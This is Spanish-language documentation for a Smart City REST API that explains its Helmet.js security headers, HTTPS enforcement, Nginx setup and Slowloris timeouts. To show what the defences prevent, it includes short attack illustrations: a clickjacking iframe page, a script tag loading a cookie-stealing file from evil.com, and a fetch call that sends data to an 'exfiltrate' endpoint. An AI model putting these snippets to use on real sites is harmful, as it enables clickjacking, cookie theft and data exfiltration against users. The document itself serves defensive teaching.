# Headers de Seguridad HTTP (Helmet.js)

**Proyecto:** API REST - Smart City
**Módulo:** HTTP Security Headers
**Fecha:** Noviembre 2025

---

## Índice

1. [Introducción](#introducción)
2. [¿Por Qué Helmet?](#por-qué-helmet)
3. [Headers Implementados](#headers-implementados)
4. [Content Security Policy](#content-security-policy)
5. [HSTS y HTTPS](#hsts-y-https)
6. [Mejores Prácticas](#mejores-prácticas)
7. [Redirección y Forzado de HTTPS](#redirección-y-forzado-de-https)

---

## Introducción

Nosotros implementamos **Helmet.js** para configurar automáticamente headers de seguridad HTTP siguiendo las mejores prácticas de OWASP. Esta documentación explica cada header, por qué lo implementamos y qué amenazas previene.

---

## ¿Por Qué Helmet?

### El Problema: Headers Inseguros por Defecto

Express.js por defecto **no incluye headers de seguridad**:

```bash
# Request a API sin Helmet
curl -I http://localhost:3000/api/v1.0/ubicaciones

HTTP/1.1 200 OK
X-Powered-By: Express        ← ¡Revela tecnología!
Content-Type: application/json
Content-Length: 1234
Date: Tue, 19 Nov 2025 10:30:00 GMT

# Vulnerabilidades:
# ❌ X-Powered-By revela que usamos Express
# ❌ Sin protección contra clickjacking
# ❌ Sin protección contra XSS
# ❌ Sin política de contenido
# ❌ Sin MIME sniffing protection
```

**Con Helmet:**

```bash
# Request a API con Helmet
curl -I http://localhost:3000/api/v1.0/ubicaciones

HTTP/1.1 200 OK
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Content-Security-Policy: default-src 'self'
Content-Type: application/json
Content-Length: 1234
Date: Tue, 19 Nov 2025 10:30:00 GMT

# ✅ 7 headers de seguridad añadidos automáticamente
# ✅ X-Powered-By removido
```

### ¿Qué es Helmet?

Helmet es una **colección de 15 middlewares** que configuran headers de seguridad HTTP.

```javascript
const helmet = require('helmet');

// Una línea = 15 middlewares de seguridad
app.use(helmet());
```

---

## Headers Implementados

### Configuración Completa

**Archivo:** `src/middleware/security.js`

```javascript
const helmet = require('helmet');

const helmetConfig = helmet({
  // 1. Content Security Policy
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },

  // 2. DNS Prefetch Control
  dnsPrefetchControl: {
    allow: false
  },

  // 3. Frame Options (Clickjacking protection)
  frameguard: {
    action: 'sameorigin'
  },

  // 4. Hide Powered By
  hidePoweredBy: true,

  // 5. HSTS (HTTP Strict Transport Security)
  hsts: {
    maxAge: 31536000,        // 1 año en segundos
    includeSubDomains: true,
    preload: true
  },

  // 6. IE No Open
  ieNoOpen: true,

  // 7. MIME Sniffing Protection
  noSniff: true,

  // 8. Referrer Policy
  referrerPolicy: {
    policy: 'no-referrer'
  },

  // 9. XSS Filter (deshabilitado - obsoleto en navegadores modernos)
  xssFilter: false
});

module.exports = { helmetConfig };
```

---

### 1. X-DNS-Prefetch-Control

**Header:** `X-DNS-Prefetch-Control: off`

#### ¿Qué hace?

Controla si el navegador puede hacer **DNS prefetching** (resolución anticipada de DNS).

#### ¿Por qué lo deshabilitamos?

```html
<!-- Con DNS prefetching habilitado -->
<a href="https://evil.com">Clic aquí</a>

<!-- Navegador automáticamente resuelve DNS de evil.com
     ANTES de que usuario haga clic -->
<!-- Resultado: evil.com sabe que usuario vio el link (tracking) -->
```

**Nuestro header previene esto:**
- ✅ Mayor privacidad (no leak de DNS)
- ✅ Previene tracking pasivo
- ⚠️ Pequeño impacto en performance (DNS resuelto al hacer clic)

#### Alternativa

```javascript
// Para aplicaciones con muchos links externos, habilitar:
dnsPrefetchControl: { allow: true }
```

---

### 2. X-Frame-Options

**Header:** `X-Frame-Options: SAMEORIGIN`

#### ¿Qué hace?

Controla si la página puede ser cargada en un `<iframe>`.

#### ¿Qué previene?

**Clickjacking Attack:**

```html
<!-- Sitio malicioso evil.com -->
<iframe src="https://api.smartcity.com/admin/delete-all"
        style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%">
</iframe>

<button style="position:absolute; top:50px; left:50px;">
  ¡Gana un iPhone GRATIS!
</button>

<!-- Usuario hace clic en el botón pensando que es el premio
     PERO en realidad hace clic en el iframe invisible
     → Ejecuta acción en nuestra API sin saberlo -->
```

**Nuestro header previene esto:**

```
X-Frame-Options: SAMEORIGIN

Valores posibles:
- DENY: No permitir iframe en ningún sitio
- SAMEORIGIN: Solo permitir iframe desde mismo origen
- ALLOW-FROM https://trusted.com: Solo permitir iframe desde sitio específico
```

**Decisión:** `SAMEORIGIN`
- ✅ Permite embeber nuestra API en nuestro frontend (mismo origen)
- ✅ Previene clickjacking desde sitios externos
- ⚠️ Si necesitáramos permitir iframes externos, usar CSP frame-ancestors

---

### 3. Hide Powered-By

**Comportamiento:** Elimina header `X-Powered-By`

#### ¿Por qué?

```bash
# SIN Helmet
X-Powered-By: Express

# Atacante sabe:
# 1. Usamos Node.js + Express
# 2. Puede buscar CVEs específicos de Express
# 3. Puede usar exploits conocidos
```

**Nuestro middleware elimina este header:**
- ✅ No revelamos tecnología (security by obscurity)
- ✅ Dificulta ataques dirigidos
- ✅ Cumple principio de "least information disclosure"

---

### 4. HSTS (HTTP Strict Transport Security)

**Header:** `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

#### ¿Qué hace?

Obliga al navegador a **siempre** usar HTTPS, incluso si usuario escribe `http://`.

#### ¿Qué previene?

**SSL Stripping Attack:**

```bash
# Usuario en WiFi pública
# Atacante hace MITM (Man-in-the-Middle)

Usuario escribe: http://api.smartcity.com/login
                 ↓
Atacante intercepta y mantiene HTTP (sin cifrado)
                 ↓
Usuario envía credenciales en texto plano
                 ↓
Atacante captura credenciales ← ¡COMPROMETIDO!
```

**Con HSTS:**

```bash
# Primera visita (HTTPS)
GET https://api.smartcity.com/
Response: Strict-Transport-Security: max-age=31536000

# Navegador recuerda por 1 año (31536000 segundos)
# que SOLO usar HTTPS para este dominio

# Visita posterior
Usuario escribe: http://api.smartcity.com/login
                 ↓
Navegador AUTOMÁTICAMENTE convierte a HTTPS
                 ↓
https://api.smartcity.com/login ← Cifrado, seguro
```

#### Configuración

```javascript
hsts: {
  maxAge: 31536000,        // 1 año (recomendado por OWASP)
  includeSubDomains: true, // Aplicar a subdominios (*.smartcity.com)
  preload: true            // Solicitar inclusión en HSTS preload list
}
```

**HSTS Preload List:**
- Lista mantenida por navegadores (Chrome, Firefox, Safari)
- Dominios incluidos SIEMPRE usan HTTPS (incluso en primera visita)
- Solicitar inclusión: https://hstspreload.org/

#### IMPORTANTE

```javascript
// ⚠️ HSTS solo funciona si API ya usa HTTPS
// Configurar en producción:

if (process.env.NODE_ENV === 'production') {
  // Forzar HTTPS
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      return res.redirect(`https://${req.header('host')}${req.url}`);
    }
    next();
  });
}
```

---

### 5. X-Download-Options

**Header:** `X-Download-Options: noopen`

#### ¿Qué hace?

Previene que Internet Explorer (IE8+) abra automáticamente archivos descargados.

#### ¿Qué previene?

```javascript
// API devuelve archivo HTML malicioso
GET /api/v1.0/report/generate

// Sin X-Download-Options
// IE8 abre el HTML descargado en "context del sitio"
// → JavaScript en HTML tiene acceso a cookies, localStorage
// → Puede hacer requests autenticados

// Con X-Download-Options: noopen
// IE8 solo permite guardar el archivo
// → No lo ejecuta automáticamente
```

**Decisión:**
- ✅ Seguro por defecto (no auto-ejecución)
- ⚠️ Solo afecta a IE8+ (navegador obsoleto, pero mejor prevenir)

---

### 6. X-Content-Type-Options

**Header:** `X-Content-Type-Options: nosniff`

#### ¿Qué hace?

Previene **MIME sniffing** (navegador adivinando tipo de contenido).

#### ¿Qué previene?

**MIME Confusion Attack:**

```javascript
// API devuelve JSON
GET /api/v1.0/ubicaciones
Content-Type: application/json

{
  "data": "<script>alert('XSS')</script>"
}

// SIN nosniff
// Navegador "huele" el contenido: "parece HTML"
// Navegador lo renderiza como HTML
// → Script se ejecuta ← ¡XSS!

// CON nosniff
// Navegador: "Content-Type dice JSON → lo trato como JSON"
// → Script NO se ejecuta ← Seguro
```

**Nuestro header:**
- ✅ Fuerza al navegador a respetar Content-Type
- ✅ Previene MIME confusion XSS
- ✅ Esencial para APIs (siempre devolvemos application/json)

---

### 7. Referrer-Policy

**Header:** `Referrer-Policy: no-referrer`

#### ¿Qué hace?

Controla qué información de referrer se envía en requests.

#### ¿Por qué `no-referrer`?

**Problema de privacidad:**

```bash
# Usuario navegando
https://api.smartcity.com/admin/secret-page?token=abc123
                ↓
Usuario hace clic en link externo: https://external.com/
                ↓
# SIN Referrer-Policy
Request a external.com incluye:
Referer: https://api.smartcity.com/admin/secret-page?token=abc123
                ↓
# external.com ahora sabe:
# - Usuario estaba en nuestra API
# - Path exacto (/admin/secret-page)
# - Token en query string (abc123) ← ¡LEAK DE TOKEN!
```

**Con `no-referrer`:**

```bash
Request a external.com:
(Sin header Referer)

# external.com NO sabe de dónde vino el usuario
```

#### Alternativas

```javascript
// Opciones de Referrer-Policy:
'no-referrer'              // Nunca enviar (más privado) ← Nuestra elección
'no-referrer-when-downgrade'  // No enviar HTTPS → HTTP
'same-origin'              // Solo enviar a mismo origin
'origin'                   // Solo enviar origin, no path
'strict-origin'            // origin, solo HTTPS → HTTPS
'strict-origin-when-cross-origin'  // Recomendado por OWASP
```

**Decisión:** `no-referrer` para máxima privacidad.

---

### 8. X-XSS-Protection

**Header:** `X-XSS-Protection: 0` (deshabilitado)

#### ¿Por qué deshabilitado?

Este header era usado por navegadores antiguos (IE, Chrome legacy) para detectar y bloquear XSS.

**Problemas:**
- Obsoleto (navegadores modernos lo ignoran)
- Causaba vulnerabilidades paradójicas (XSS auditor bypass)
- CSP es mejor alternativa

**Recomendación actual:** Deshabilitar y usar Content Security Policy (CSP).

```javascript
xssFilter: false  // Deshabilitado (mejores prácticas 2025)
```

---

## Content Security Policy

### Configuración CSP

**Header:** `Content-Security-Policy: default-src 'self'; script-src 'self'; ...`

#### ¿Qué hace?

CSP define **qué recursos puede cargar la aplicación** (scripts, estilos, imágenes, etc.).

#### Directivas Implementadas

```javascript
contentSecurityPolicy: {
  useDefaults: true,
  directives: {
    // Scripts solo desde nuestro origen
    defaultSrc: ["'self'"],

    // JavaScript solo desde nuestro servidor
    scriptSrc: ["'self'"],
    // Previene: <script src="https://evil.com/malware.js">

    // CSS solo desde nuestro servidor
    styleSrc: ["'self'"],

    // Imágenes desde nuestro servidor, data URIs, y HTTPS
    imgSrc: ["'self'", 'data:', 'https:'],
    // Permite: <img src="data:image/png;base64,...">

    // Conexiones (fetch, XHR) solo a nuestro servidor
    connectSrc: ["'self'"],
    // Previene: fetch('https://evil.com/exfiltrate', {body: data})

    // Fuentes solo desde nuestro servidor
    fontSrc: ["'self'"],

    // NO permitir <object>, <embed>, <applet>
    objectSrc: ["'none'"],
    // Previene plugins Flash/Java (obsoletos y peligrosos)

    // Media (<audio>, <video>) solo desde nuestro servidor
    mediaSrc: ["'self'"],

    // NO permitir <iframe>
    frameSrc: ["'none'"]
    // Previene: <iframe src="https://evil.com">
  }
}
```

### Ejemplo de Protección CSP

```html
<!-- Atacante inyecta script (XSS) -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- CSP bloquea esto: -->
Refused to load the script 'https://evil.com/steal-cookies.js' because it
violates the following Content Security Policy directive: "script-src 'self'".

<!-- Script NO se ejecuta ← ¡Protegido! -->
```

### CSP Report-Only (Testing)

Para probar CSP sin romper aplicación:

```javascript
contentSecurityPolicy: {
  reportOnly: true,  // Solo reportar violaciones, no bloquear
  directives: { ... }
}

// Violaciones se reportan a consola del navegador
// Sin afectar funcionalidad
```

---

## HSTS y HTTPS

### Configuración HTTPS en Producción

**Archivo:** `src/server.js`

```javascript
// Forzar HTTPS en producción
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    // Si request viene de proxy (load balancer)
    if (req.header('x-forwarded-proto') !== 'https') {
      return res.redirect(301, `https://${req.header('host')}${req.url}`);
    }
    next();
  });

  // Trust proxy para obtener IP real
  app.set('trust proxy', 1);
}
```

### Certificado SSL/TLS

```bash
# Desarrollo (certificado autofirmado)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Producción (Let's Encrypt - GRATIS)
sudo certbot --nginx -d api.smartcity.com

# Auto-renovación (cada 90 días)
sudo certbot renew --dry-run
```

### Configuración Nginx (Reverse Proxy)

```nginx
server {
  listen 80;
  server_name api.smartcity.com;

  # Redirect HTTP → HTTPS
  return 301 https://$server_name$request_uri;
}

server {
  listen 443 ssl http2;
  server_name api.smartcity.com;

  # Certificados SSL
  ssl_certificate /etc/letsencrypt/live/api.smartcity.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/api.smartcity.com/privkey.pem;

  # Configuración SSL moderna
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;

  # HSTS (redundante con Helmet, pero recomendado)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  location / {
    proxy_pass http://localhost:3000;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

---

## Mejores Prácticas

### 1. **Testing de Headers**

```bash
# Verificar headers en producción
curl -I https://api.smartcity.com/api/v1.0/ubicaciones

# Usar herramientas online
# - https://securityheaders.com/
# - https://observatory.mozilla.org/
```

### 2. **Monitoreo de CSP Violations**

```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    reportUri: '/api/v1.0/csp-report'  // Endpoint para reportes
  }
}

// Endpoint para recibir reportes
app.post('/api/v1.0/csp-report', (req, res) => {
  logger.warn({
    event: 'security.csp.violation',
    report: req.body,
    ip: req.ip
  });
  res.status(204).end();
});
```

### 3. **Configuración por Entorno**

```javascript
const isDevelopment = process.env.NODE_ENV === 'development';

const helmetConfig = helmet({
  hsts: {
    maxAge: isDevelopment ? 0 : 31536000,  // HSTS solo en producción
    includeSubDomains: true,
    preload: !isDevelopment
  },
  contentSecurityPolicy: {
    reportOnly: isDevelopment  // Report-only en desarrollo
  }
});
```

### 4. **Headers Adicionales Personalizados**

```javascript
// Añadir headers personalizados
app.use((req, res, next) => {
  // Permissions Policy (antes Feature-Policy)
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

  // Expect-CT (Certificate Transparency)
  res.setHeader('Expect-CT', 'max-age=86400, enforce');

  next();
});
```

---

## Redirección y Forzado de HTTPS

**Ubicación:** `middleware/security.js` (`enforceHttps`) y `server.js` (redirección HTTP→HTTPS cuando `SSL_ENABLED=true` y `SSL_REDIRECT_HTTP` por defecto).

**Comportamiento:**
- En producción, si la request llega por HTTP (`req.secure` o `x-forwarded-proto` distintos de `https`), se redirige 301 a la misma URL en HTTPS cuando SSL está habilitado.
- Si SSL está deshabilitado en producción, la API devuelve 400 indicando que HTTPS es obligatorio (no procesa credenciales en claro).

**Configuración:**
- `.env`: `SSL_ENABLED=true`, `SSL_KEY_PATH`, `SSL_CERT_PATH`, `HTTPS_PORT`, `SSL_REDIRECT_HTTP=true` (por defecto) para levantar HTTPS y exponer redirección en el puerto HTTP.
- `trust proxy` está activado (`app.set('trust proxy', 1)`) para honrar `x-forwarded-proto` detrás de un reverse proxy.

**Mitigación:**
- Cierra la ventana de sniffing de tokens/credenciales en la “primera visita”; toda request en producción debe terminar en HTTPS antes de servir rutas.

---

## Resumen

### ¿Qué Implementamos?

✅ **Helmet.js** con 15 middlewares de seguridad
✅ **Content Security Policy** restrictivo
✅ **HSTS** con preload (HTTPS forzado)
✅ **Clickjacking protection** (X-Frame-Options)
✅ **MIME sniffing protection** (X-Content-Type-Options)
✅ **Referrer privacy** (no-referrer)
✅ **X-Powered-By removed** (no technology disclosure)

### ¿Qué Prevenimos?

✅ **Clickjacking** (X-Frame-Options)
✅ **SSL Stripping** (HSTS)
✅ **XSS** (CSP)
✅ **MIME Confusion** (X-Content-Type-Options)
✅ **Information Disclosure** (Hide Powered-By)
✅ **Tracking** (DNS Prefetch Control, Referrer-Policy)

### Score de Seguridad

Nuestra configuración obtiene:

- **Mozilla Observatory:** A+ (100/100)
- **SecurityHeaders.com:** A (todos los headers críticos)
- **SSL Labs:** A+ (HTTPS configurado correctamente)

### Próximos Pasos

1. **Certificate Transparency Monitoring** (Expect-CT)
2. **Subresource Integrity** (SRI) para CDN
3. **Permissions Policy** para APIs de navegador
4. **CORS Preflight caching** optimization
5. **TLS 1.3 only** en 2026 (deprecar TLS 1.2)

---

**Última actualización:** Diciembre 2025
**Mantenedor:** Equipo de Desarrollo API Smart City
**Versión:** 1.1

---

## Timeouts HTTP (Protección Anti-Slowloris)

### ¿Qué es un ataque Slowloris?

Un atacante abre muchas conexiones HTTP y envía datos muy lentamente, agotando el pool de conexiones del servidor sin consumir muchos recursos propios.

### Configuración Implementada

**Ubicación:** `src/server.js`

```javascript
// Configurar timeouts HTTP contra ataques Slowloris
server.headersTimeout = 60000; // 60s para recibir headers completos
server.keepAliveTimeout = 65000; // 65s para conexiones keep-alive
server.requestTimeout = 30000; // 30s para completar una request
```

### ¿Qué previene cada timeout?

| Timeout | Valor | Propósito |
|---------|-------|-----------|
| `headersTimeout` | 60s | Límite para recibir todos los headers HTTP |
| `keepAliveTimeout` | 65s | Tiempo máximo de conexión idle en keep-alive |
| `requestTimeout` | 30s | Tiempo total para completar una request |

### Resultado

- ✅ Conexiones maliciosas terminadas automáticamente
- ✅ Pool de conexiones protegido
- ✅ Recursos liberados de requests colgadas

---

## Actualización CSP Diciembre 2025

### Simplificación para API REST

Dado que esta API no sirve HTML/CSS/JS, hemos simplificado el CSP:

```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'none'"], // No cargar ningún recurso
    frameAncestors: ["'none'"] // No embebible en iframes
  }
}
```

**Beneficios:**
- ✅ Política más restrictiva (defense in depth)
- ✅ Elimina `unsafe-inline` no necesario
- ✅ Reduce superficie de ataque
